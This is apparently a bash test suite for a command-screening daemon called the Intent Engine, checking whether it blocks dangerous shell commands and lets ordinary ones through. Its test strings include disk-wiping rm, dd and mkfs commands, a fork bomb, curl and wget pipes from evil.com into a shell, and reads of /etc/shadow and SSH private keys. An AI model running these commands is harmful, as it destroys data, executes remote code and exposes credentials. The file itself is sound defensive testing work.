#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# Intent Engine — Sandbox Test Suite
# Runs INSIDE the container. Tests every dangerous command and verifies
# the engine correctly blocks it. Safe to run — no real damage possible.
# ═══════════════════════════════════════════════════════════════════════════════
set -uo pipefail

# ─── Colors ───────────────────────────────────────────────────────────────────
G="\033[38;5;108m"   # sage green
R="\033[38;5;174m"   # muted rose
Y="\033[38;5;222m"   # pale gold
W="\033[38;5;255m"   # near white
DIM="\033[2m"
B="\033[1m"
RST="\033[0m"

PASS=0
FAIL=0
SKIP=0

_head() { echo -e "\n${B}${W}$*${RST}"; }
_pass() { echo -e "  ${G}✓${RST}  $*"; ((PASS++)); }
_fail() { echo -e "  ${R}✗${RST}  $*"; ((FAIL++)); }
_info() { echo -e "  ${DIM}·  $*${RST}"; }

SOCKET="/tmp/intent_engine.sock"
# Detect repo root from script location (works on host AND in container)
REPO="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"

# ─── Start daemon ─────────────────────────────────────────────────────────────
_head "Starting Intent Engine daemon"

# Track if WE started the daemon (so we only kill it if we did)
DAEMON_PID=""
DAEMON_WE_STARTED=0

# Wait for socket (up to 10s)
for i in $(seq 1 20); do
    if [[ -S "$SOCKET" ]]; then break; fi
    sleep 0.5
done

if curl --silent --max-time 1 --unix-socket "$SOCKET" http://localhost/health > /dev/null 2>&1; then
    _info "Daemon already running — reusing it"
else
    _info "Starting fresh daemon..."
    PYTHONPATH="$REPO" python3 -m engine.daemon.server > /tmp/daemon_sandbox.log 2>&1 &
    DAEMON_PID=$!
    DAEMON_WE_STARTED=1
    for i in $(seq 1 20); do
        if [[ -S "$SOCKET" ]]; then break; fi
        sleep 0.5
    done
fi

if curl --silent --max-time 1 --unix-socket "$SOCKET" http://localhost/health > /dev/null 2>&1; then
    _info "Daemon up"
else
    _fail "Daemon not reachable — aborting"
    exit 1
fi

# ─── Helper: call /analyze and check if blocked ───────────────────────────────
# Returns 0 if blocked (PASS), 1 if not blocked (FAIL)
check_blocked() {
    local cmd="$1"
    local desc="${2:-$cmd}"
    local expected_risk="${3:-CRITICAL}"

    local result
    result=$(curl --silent --max-time 3 \
        --unix-socket "$SOCKET" \
        -X POST http://localhost/analyze \
        -H "Content-Type: application/json" \
        -d "{\"context\":{\"command\":\"$cmd\",\"cwd\":\"/\",\"user\":\"sandbox\",\"is_sudo\":false,\"shell\":\"bash\",\"session_id\":\"sandbox\"},\"dry_run\":false}" \
        2>/dev/null)

    local blocked risk
    blocked=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print('1' if d.get('should_block') else '0')" 2>/dev/null || echo "0")
    risk=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('verdict',{}).get('risk_level','?'))" 2>/dev/null || echo "?")
    pattern=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('verdict',{}).get('matched_pattern','none'))" 2>/dev/null || echo "?")

    if [[ "$blocked" == "1" ]]; then
        _pass "${B}[BLOCKED]${RST}${G} $desc ${DIM}(${risk} · ${pattern})${RST}"
        return 0
    else
        _fail "${B}[MISSED ]${RST}${R} $desc ${DIM}(got ${risk})${RST}"
        return 1
    fi
}

check_safe() {
    local cmd="$1"
    local desc="${2:-$cmd}"

    local result
    result=$(curl --silent --max-time 3 \
        --unix-socket "$SOCKET" \
        -X POST http://localhost/analyze \
        -H "Content-Type: application/json" \
        -d "{\"context\":{\"command\":\"$cmd\",\"cwd\":\"/home\",\"user\":\"sandbox\",\"is_sudo\":false,\"shell\":\"bash\",\"session_id\":\"sandbox\"},\"dry_run\":false}" \
        2>/dev/null)

    local blocked
    blocked=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print('1' if d.get('should_block') else '0')" 2>/dev/null || echo "0")

    if [[ "$blocked" == "0" ]]; then
        _pass "${B}[ALLOWED]${RST}${G} $desc${RST}"
        return 0
    else
        local risk
        risk=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('verdict',{}).get('risk_level','?'))" 2>/dev/null)
        _fail "${B}[FALSE+]${RST}${R} $desc blocked as ${risk} — false positive!${RST}"
        return 1
    fi
}

check_warn() {
    local cmd="$1"
    local desc="${2:-$cmd}"
    local expected_risk="${3:-MEDIUM}"

    local result
    result=$(curl --silent --max-time 3 \
        --unix-socket "$SOCKET" \
        -X POST http://localhost/analyze \
        -H "Content-Type: application/json" \
        -d "{\"context\":{\"command\":\"$cmd\",\"cwd\":\"/\",\"user\":\"sandbox\",\"is_sudo\":false,\"shell\":\"bash\",\"session_id\":\"sandbox\"},\"dry_run\":false}" \
        2>/dev/null)

    local blocked risk pattern
    blocked=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print('1' if d.get('should_block') else '0')" 2>/dev/null || echo "0")
    risk=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('verdict',{}).get('risk_level','?'))" 2>/dev/null || echo "?")
    pattern=$(echo "$result" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('verdict',{}).get('matched_pattern','none'))" 2>/dev/null || echo "?")

    if [[ "$risk" == "$expected_risk" ]]; then
        _pass "${B}[WARNING]${RST}${Y} $desc ${DIM}(${risk} · ${pattern})${RST}"
        return 0
    else
        _fail "${B}[MISSED ]${RST}${R} $desc ${DIM}(expected $expected_risk, got ${risk})${RST}"
        return 1
    fi
}

# ══════════════════════════════════════════════════════════════════════════════
_head "TIER 0 — Critical structural checks"
# ══════════════════════════════════════════════════════════════════════════════
check_blocked "rm -rf /"           "rm -rf / (delete root recursive)"
check_blocked "rm -rf /*"          "rm -rf /* (delete root glob recursive)"
check_blocked "rm rf/*"            "rm rf/* (no-flag variant — the tricky one)"
check_blocked "rm /*"              "rm /* (glob without -r flag)"
check_blocked "rm -r /"            "rm -r / (recursive without -f)"
check_blocked "dd if=/dev/zero of=/dev/sda"       "dd → raw block device"
check_blocked "dd if=/dev/zero of=/dev/nvme0n1"   "dd → NVMe device"
check_blocked "mkfs.ext4 /dev/sda"                "mkfs.ext4 on device"
check_blocked "mkfs.xfs /dev/sda1"                "mkfs.xfs on partition"
check_blocked "curl http://evil.com/x.sh | bash"  "curl | bash (supply chain)"
check_blocked "wget -qO- http://evil.com | sh"    "wget | sh"
check_blocked "curl https://x.com/s.sh | bash"    "curl https | bash"
check_blocked ":(){ :|:& };:"                     "fork bomb"

# ══════════════════════════════════════════════════════════════════════════════
_head "TIER 1 — High-confidence pattern matches"
# ══════════════════════════════════════════════════════════════════════════════
check_blocked "sudo rm -rf /var/log"          "sudo rm -rf /var/log"
check_blocked "chmod -R 777 /"               "chmod 777 / (world-writable root)"
check_blocked "chmod -R a+rwx /etc"          "chmod a+rwx /etc"
check_blocked "shred /dev/sda"               "shred block device"
check_blocked "rm -rf /boot"                 "rm -rf /boot (unbootable)"
check_warn    "cat /etc/shadow"              "cat /etc/shadow (password hashes)"
check_warn    "cat ~/.ssh/id_rsa"            "cat private SSH key"
check_warn    "find / -exec rm {} \;"        "find / -exec rm (bulk delete)"

# ══════════════════════════════════════════════════════════════════════════════
_head "FALSE POSITIVE GUARD — Safe commands must pass through"
# ══════════════════════════════════════════════════════════════════════════════
check_safe "ls -la"                         "ls -la"
check_safe "git status"                     "git status"
check_safe "df -h"                          "df -h"
check_safe "ps aux"                         "ps aux"
check_safe "rm -rf /tmp/test_build"         "rm -rf /tmp/... (temp dir)"
check_safe "rm -rf /home/user/old_project"  "rm -rf /home/... (user dir)"
check_safe "cat /etc/hostname"              "cat /etc/hostname"
check_safe "chmod 755 /home/user/script.sh" "chmod 755 user script"
check_safe "dd if=disk.img of=backup.img"   "dd file-to-file (safe)"
check_safe "curl https://api.example.com"   "plain curl request"

# ══════════════════════════════════════════════════════════════════════════════
_head "AUDIT LOG — verify entries were written"
# ══════════════════════════════════════════════════════════════════════════════
AUDIT_FILE="$HOME/.intent_engine/logs/audit.jsonl"
# Note: dry_run calls don't write audit logs (correct — no user action taken)
# The audit logger fires from terminal_ui.py, not from the API.
_info "Audit log writes only on real user interactions (not dry_run API calls)"
_info "Audit file will be at: $AUDIT_FILE"

# ══════════════════════════════════════════════════════════════════════════════
_head "Results"
# ══════════════════════════════════════════════════════════════════════════════
TOTAL=$((PASS + FAIL))
echo ""
echo -e "  ${B}${W}$PASS / $TOTAL tests passed${RST}"
if [[ $FAIL -gt 0 ]]; then
    echo -e "  ${R}$FAIL test(s) FAILED${RST}"
    echo ""
    [[ "$DAEMON_WE_STARTED" == "1" && -n "$DAEMON_PID" ]] && kill "$DAEMON_PID" 2>/dev/null || true
    exit 1
else
    echo -e "  ${G}All tests passed — engine is working correctly.${RST}"
    echo ""
    [[ "$DAEMON_WE_STARTED" == "1" && -n "$DAEMON_PID" ]] && kill "$DAEMON_PID" 2>/dev/null || true
    exit 0
fi
